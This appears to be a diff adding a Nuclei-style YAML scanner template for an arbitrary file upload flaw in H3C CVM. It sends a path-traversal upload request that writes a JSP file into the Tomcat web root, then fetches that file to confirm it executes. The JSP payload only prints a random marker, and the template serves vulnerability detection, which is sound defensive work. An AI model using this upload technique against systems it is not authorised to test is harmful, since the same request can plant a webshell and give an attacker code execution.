@@ -1,0 +1,45 @@
+id: h3c-cvm-fileupload-anyfile-upload
+info:
+  name: H3C CVM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(3)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{t1}}.jsp&name=123"
+    headers:
+      Content-Range: "bytes 0-10/20"
+    body: "<%out.println(\"{{t2}}\");%>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/cas/js/lib/buttons/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
